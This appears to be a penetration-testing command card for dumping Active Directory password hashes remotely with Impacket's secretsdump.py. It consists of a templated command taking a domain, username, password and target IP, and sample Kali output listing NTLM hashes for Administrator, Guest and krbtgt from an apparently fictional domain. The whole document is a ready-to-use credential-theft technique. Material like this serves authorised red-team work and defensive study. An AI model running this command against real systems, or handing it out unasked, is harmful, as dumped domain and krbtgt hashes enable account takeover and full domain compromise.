---
id: a87ed429-8db3-4bd4-8424-2ac200c81d5a
name: Dump Password Hashes from a Remote System (Authenticated)
type: command
executor: bash
data: python3 secretsdump.py $_DOMAIN/$_USER:$_PASSWORD@$_TARGET_IP
output: "root@kali:/usr/share/doc/python3-impacket/examples# python3 secretsdump.py\
  \ megabank.local/bob:s3cr3tPASS@10.10.10.10\nImpacket v0.9.20 - Copyright 2019 SecureAuth\
  \ Corporation\n[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied\
  \ \n[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)\n[*] Using the\
  \ DRSUAPI method to get NTDS.DIT secrets\nmegabank.local\\Administrator:500:aad3b435b51404eeaad3b435b51404ee:fd030f3d045072c0508748d1c953862b:::\n\
  Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\n\
  krbtgt:502:aad3b435b51404eeaad3b435b51404ee:818af826bb138e603acb0f33d17632f8:::"
created_at: '2020-03-16T01:39:57.837512+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# Dump Password Hashes from a Remote System (Authenticated)

```bash
python3 secretsdump.py $_DOMAIN/$_USER:$_PASSWORD@$_TARGET_IP
```

## Expected Output

```
root@kali:/usr/share/doc/python3-impacket/examples# python3 secretsdump.py megabank.local/bob:s3cr3tPASS@10.10.10.10
Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation
[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
megabank.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:fd030f3d045072c0508748d1c953862b:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:818af826bb138e603acb0f33d17632f8:::
```


